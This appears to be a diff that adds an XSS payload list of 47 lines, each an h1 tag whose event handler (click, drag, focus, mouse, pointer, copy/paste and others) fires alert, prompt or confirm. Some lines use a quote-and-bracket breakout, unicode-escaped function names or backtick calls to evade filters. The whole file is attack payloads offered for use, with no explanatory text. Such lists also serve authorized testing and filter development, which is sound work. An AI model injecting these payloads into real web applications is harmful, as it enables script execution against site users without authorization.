@@ -1,0 +1,47 @@
+“><h1 onclick=prompt(1)>Clickme</h1>
+“><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>
+“><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
+<h1 draggable="true" ondrag="alert(1)">test</h1>
+<h1 draggable="true" ondragend="alert(1)">test</h1>
+<h1 draggable="true" ondragenter="alert(1)">test</h1>
+<h1 draggable="true" ondragleave="alert(1)">test</h1>
+<h1 draggable="true" ondragstart="alert(1)">test</h1>
+<h1 id=x tabindex=1 onactivate=alert(1)></h1>
+<h1 id=x tabindex=1 onbeforeactivate=alert(1)></h1>
+<h1 id=x tabindex=1 onbeforedeactivate=alert(1)></h1><input autofocus>
+<h1 id=x tabindex=1 ondeactivate=alert(1)></h1><input id=y autofocus>
+<h1 id=x tabindex=1 onfocus=alert(1)></h1>
+<h1 id=x tabindex=1 onfocusin=alert(1)></h1>
+<h1 onafterscriptexecute=alert(1)><script>1</script>
+<h1 onbeforecopy="alert(1)" contenteditable>test</h1>
+<h1 onbeforecut="alert(1)" contenteditable>test</h1>
+<h1 onbeforepaste="alert(1)" contenteditable>test</h1>
+<h1 onbeforescriptexecute=alert(1)><script>1</script>
+<h1 onblur=alert(1) tabindex=1 id=x></h1><input autofocus>
+<h1 onclick="alert(1)">test</h1>
+<h1 oncontextmenu="alert(1)">test</h1>
+<h1 oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<h1 oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<h1 ondblclick="alert(1)" autofocus tabindex=1>test</h1>
+<h1 onfocusout=alert(1) tabindex=1 id=x></h1><input autofocus>
+<h1 onkeydown="alert(1)" contenteditable>test</h1>
+<h1 onkeypress="alert(1)" contenteditable>test</h1>
+<h1 onkeyup="alert(1)" contenteditable>test</h1>
+<h1 onmousedown="alert(1)">test</h1>
+<h1 onmouseenter="alert(1)">test</h1>
+<h1 onmouseleave="alert(1)">test</h1>
+<h1 onmousemove="alert(1)">test</h1>
+<h1 onmouseout="alert(1)">test</h1>
+<h1 onmouseover="alert(1)">test</h1>
+<h1 onmouseup="alert(1)">test</h1>
+<h1 onmousewheel=alert(1)>requires scrolling
+<h1 onpaste="alert(1)" contenteditable>test</h1>
+<h1 onpointerdown=alert(1)>XSS</h1>
+<h1 onpointerenter=alert(1)>XSS</h1>
+<h1 onpointerleave=alert(1)>XSS</h1>
+<h1 onpointermove=alert(1)>XSS</h1>
+<h1 onpointerout=alert(1)>XSS</h1>
+<h1 onpointerover=alert(1)>XSS</h1>
+<h1 onpointerrawupdate=alert(1)>XSS</h1>
+<h1 onpointerup=alert(1)>XSS</h1>
+<h1/onclick=alert(1)>a//INJECTX
